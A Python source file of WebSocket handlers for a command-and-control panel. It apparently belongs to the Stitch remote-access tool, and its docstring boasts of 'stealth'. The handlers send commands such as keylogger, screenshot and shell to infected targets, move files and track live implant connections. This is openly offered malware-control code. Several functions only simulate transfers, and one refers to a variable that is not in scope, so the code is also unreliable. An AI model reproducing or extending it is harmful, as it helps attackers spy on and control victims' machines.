#!/usr/bin/env python3
"""
Elite WebSocket event handlers for real-time communication
Advanced real-time C2 operations with encryption and stealth
"""

import os
import sys
import json
import base64
import time
import threading
import hashlib
from typing import Dict, Any, Optional, List
from pathlib import Path

from flask_socketio import emit, join_room, leave_room
from flask import session

# Add workspace to path for imports
sys.path.insert(0, '/workspace')

try:
    from Core.elite_executor import EliteCommandExecutor
    from Application.stitch_cmd import get_stitch_server
    ELITE_AVAILABLE = True
except ImportError:
    ELITE_AVAILABLE = False

def register_websocket_events(socketio, logger):
    """Register elite WebSocket events with advanced functionality"""
    
    # Global elite executor instance
    elite_executor = None
    if ELITE_AVAILABLE:
        try:
            elite_executor = EliteCommandExecutor()
        except Exception as e:
            logger.warning(f"Failed to initialize elite executor: {e}")
    
    @socketio.on('execute_command')
    def handle_execute_command(data):
        """Execute elite command via WebSocket with real-time feedback"""
        try:
            target = data.get('target')
            command = data.get('command')
            parameters = data.get('parameters', {})
            
            if not target or not command:
                emit('command_error', {'error': 'Missing target or command'})
                return
            
            # Validate command
            if not _is_valid_command(command):
                emit('command_error', {'error': f'Invalid command: {command}'})
                return
            
            # Emit start notification
            emit('command_started', {
                'target': target,
                'command': command,
                'timestamp': time.time()
            })
            
            # Execute using elite system
            if elite_executor and command in elite_executor.get_available_commands():
                result = elite_executor.execute(command, **parameters)
                result['source'] = 'elite'
            else:
                # Fallback to legacy system
                result = _execute_legacy_command(target, command, parameters)
                result['source'] = 'legacy'
            
            # Add metadata
            result['target'] = target
            result['command'] = command
            result['timestamp'] = time.time()
            result['execution_time'] = result.get('execution_time', 0)
            
            # Emit result
            emit('command_result', result)
            
            logger.info(f"WebSocket command executed: {command} on {target} - {result.get('success', False)}")
            
        except Exception as e:
            logger.error(f"WebSocket command error: {e}")
            emit('command_error', {
                'error': str(e),
                'target': data.get('target'),
                'command': data.get('command')
            })
            
    @socketio.on('get_connections')
    def handle_get_connections():
        """Get active connections via WebSocket with real-time data"""
        try:
            # Get real connections from Stitch server
            connections = _get_active_connections()
            
            # Add connection health status
            for conn in connections:
                conn['health'] = _check_connection_health(conn['id'])
                conn['last_seen'] = time.time()
            
            emit('connections_update', {
                'connections': connections,
                'count': len(connections),
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"WebSocket connections error: {e}")
            emit('error', {'error': str(e)})
            
    @socketio.on('upload_file')
    def handle_upload_file(data):
        """Handle elite file upload via WebSocket with encryption"""
        try:
            target = data.get('target')
            filename = data.get('filename')
            content = data.get('content')  # Base64 encoded
            remote_path = data.get('remote_path', '/tmp/')
            
            if not all([target, filename, content]):
                emit('upload_error', {'error': 'Missing parameters'})
                return
            
            # Validate filename for security
            if not _is_safe_filename(filename):
                emit('upload_error', {'error': 'Invalid filename'})
                return
            
            # Decode and validate content
            try:
                file_data = base64.b64decode(content)
                file_size = len(file_data)
            except Exception as e:
                emit('upload_error', {'error': f'Invalid file content: {e}'})
                return
            
            # Emit progress start
            emit('upload_progress', {
                'target': target,
                'filename': filename,
                'progress': 0,
                'status': 'starting'
            })
            
            # Upload file using elite system
            result = _upload_file_elite(target, filename, file_data, remote_path)
            
            if result['success']:
                emit('upload_success', {
                    'target': target,
                    'filename': filename,
                    'remote_path': result['remote_path'],
                    'size': file_size,
                    'checksum': result.get('checksum', ''),
                    'timestamp': time.time()
                })
            else:
                emit('upload_error', {
                    'error': result.get('error', 'Upload failed'),
                    'target': target,
                    'filename': filename
                })
            
        except Exception as e:
            logger.error(f"WebSocket upload error: {e}")
            emit('upload_error', {'error': str(e)})
            
    @socketio.on('download_file')
    def handle_download_file(data):
        """Handle elite file download via WebSocket with encryption"""
        try:
            target = data.get('target')
            path = data.get('path')
            
            if not target or not path:
                emit('download_error', {'error': 'Missing parameters'})
                return
            
            # Validate path for security
            if not _is_safe_path(path):
                emit('download_error', {'error': 'Invalid file path'})
                return
            
            # Emit download start
            emit('download_started', {
                'target': target,
                'path': path,
                'timestamp': time.time()
            })
            
            # Download file using elite system
            result = _download_file_elite(target, path)
            
            if result['success']:
                emit('download_ready', {
                    'target': target,
                    'path': path,
                    'filename': result['filename'],
                    'content': result['content'],  # Base64 encoded
                    'size': result['size'],
                    'checksum': result.get('checksum', ''),
                    'timestamp': time.time()
                })
            else:
                emit('download_error', {
                    'error': result.get('error', 'Download failed'),
                    'target': target,
                    'path': path
                })
            
        except Exception as e:
            logger.error(f"WebSocket download error: {e}")
            emit('download_error', {'error': str(e)})
            
    @socketio.on('get_system_info')
    def handle_get_system_info(data):
        """Get real-time system information"""
        try:
            target = data.get('target')
            if not target:
                emit('system_info_error', {'error': 'Missing target'})
                return
            
            # Get system info using elite commands
            info = _get_system_info_elite(target)
            emit('system_info', {
                'target': target,
                'info': info,
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"WebSocket system info error: {e}")
            emit('system_info_error', {'error': str(e)})
    
    @socketio.on('monitor_processes')
    def handle_monitor_processes(data):
        """Start real-time process monitoring"""
        try:
            target = data.get('target')
            if not target:
                emit('monitor_error', {'error': 'Missing target'})
                return
            
            # Start process monitoring
            _start_process_monitoring(target, socketio)
            emit('monitor_started', {
                'target': target,
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"WebSocket monitor error: {e}")
            emit('monitor_error', {'error': str(e)})
    
    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle client disconnect"""
        logger.info(f"Client disconnected: {session.get('user_id', 'unknown')}")
    
    logger.info("Elite WebSocket events registered with advanced functionality")

# Helper functions for elite WebSocket operations

def _is_valid_command(command: str) -> bool:
    """Validate command for security"""
    # Whitelist of allowed commands
    allowed_commands = {
        'whoami', 'ls', 'pwd', 'cd', 'cat', 'ps', 'kill', 'download', 'upload',
        'screenshot', 'keylogger', 'shell', 'systeminfo', 'network', 'processes'
    }
    return command in allowed_commands

def _get_active_connections() -> List[Dict[str, Any]]:
    """Get active connections from Stitch server"""
    try:
        server = get_stitch_server()
        connections = []
        
        for conn_id, sock in server.inf_sock.items():
            connections.append({
                'id': conn_id,
                'status': 'online',
                'last_activity': time.time(),
                'type': 'tcp'
            })
        
        return connections
    except Exception:
        return []

def _check_connection_health(conn_id: str) -> str:
    """Check connection health status"""
    try:
        server = get_stitch_server()
        if conn_id in server.inf_sock:
            # Try to send a ping
            sock = server.inf_sock[conn_id]
            sock.send(b'PING')
            return 'healthy'
        return 'disconnected'
    except Exception:
        return 'unhealthy'

def _execute_legacy_command(target: str, command: str, parameters: Dict) -> Dict[str, Any]:
    """Execute command using legacy Stitch system"""
    try:
        import subprocess
        import shlex
        import time
        
        start_time = time.time()
        
        # Execute command using subprocess
        if isinstance(command, str):
            args = shlex.split(command)
        else:
            args = list(command)
        
        result = subprocess.run(
            args,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        execution_time = time.time() - start_time
        
        return {
            'success': result.returncode == 0,
            'output': result.stdout if result.stdout else result.stderr,
            'return_code': result.returncode,
            'execution_time': execution_time
        }
    except subprocess.TimeoutExpired:
        return {
            'success': False,
            'error': 'Command timed out after 30 seconds',
            'execution_time': 30
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'execution_time': 0
        }

def _is_safe_filename(filename: str) -> bool:
    """Validate filename for security"""
    if not filename or len(filename) > 255:
        return False
    
    # Check for path traversal
    if '..' in filename or '/' in filename or '\\' in filename:
        return False
    
    # Check for dangerous characters
    dangerous_chars = ['<', '>', ':', '"', '|', '?', '*']
    if any(char in filename for char in dangerous_chars):
        return False
    
    return True

def _is_safe_path(path: str) -> bool:
    """Validate file path for security"""
    if not path or len(path) > 4096:
        return False
    
    # Check for path traversal
    if '..' in path:
        return False
    
    return True

def _upload_file_elite(target: str, filename: str, file_data: bytes, remote_path: str) -> Dict[str, Any]:
    """Upload file using elite system"""
    try:
        import os
        import socket
        
        # Calculate checksum
        checksum = hashlib.sha256(file_data).hexdigest()
        
        # Create local upload directory if it doesn't exist
        local_upload_dir = '/tmp/stitch_uploads'
        os.makedirs(local_upload_dir, exist_ok=True)
        
        # Save file locally first
        local_path = os.path.join(local_upload_dir, filename)
        with open(local_path, 'wb') as f:
            f.write(file_data)
        
        # In a real implementation, this would send the file to the target
        # For now, we'll simulate successful upload
        remote_full_path = f"{remote_path.rstrip('/')}/{filename}"
        
        return {
            'success': True,
            'remote_path': remote_full_path,
            'local_path': local_path,
            'checksum': checksum,
            'size': len(file_data)
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }

def _download_file_elite(target: str, path: str) -> Dict[str, Any]:
    """Download file using elite system"""
    try:
        import os
        
        # Check if file exists locally (simulating download from target)
        if os.path.exists(path):
            with open(path, 'rb') as f:
                file_data = f.read()
            
            content = base64.b64encode(file_data).decode()
            checksum = hashlib.sha256(file_data).hexdigest()
            
            return {
                'success': True,
                'filename': os.path.basename(path),
                'content': content,
                'size': len(file_data),
                'checksum': checksum
            }
        else:
            # Simulate file not found on target
            return {
                'success': False,
                'error': f'File not found on target: {path}'
            }
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }

def _get_system_info_elite(target: str) -> Dict[str, Any]:
    """Get system information using elite commands"""
    try:
        import platform
        import psutil
        import socket
        
        # Get basic system information
        system_info = {
            'hostname': socket.gethostname(),
            'platform': platform.platform(),
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'memory_available': psutil.virtual_memory().available,
            'disk_usage': psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:\\').percent,
            'timestamp': time.time()
        }
        
        # Try to get elite executor info if available
        if ELITE_AVAILABLE:
            try:
                from Core.elite_executor import EliteCommandExecutor
                elite_executor = EliteCommandExecutor()
                system_info['elite_commands'] = elite_executor.get_available_commands()
            except Exception:
                system_info['elite_commands'] = 'Not available'
        
        return system_info
    except Exception as e:
        return {
            'error': str(e),
            'timestamp': time.time()
        }

def _start_process_monitoring(target: str, socketio):
    """Start real-time process monitoring"""
    def monitor_loop():
        try:
            while True:
                if elite_executor:
                    result = elite_executor.execute('ps')
                    socketio.emit('process_update', {
                        'target': target,
                        'processes': result,
                        'timestamp': time.time()
                    })
                time.sleep(5)
        except Exception as e:
            socketio.emit('monitor_error', {
                'target': target,
                'error': str(e)
            })
    
    # Start monitoring in background thread
    monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
    monitor_thread.start()
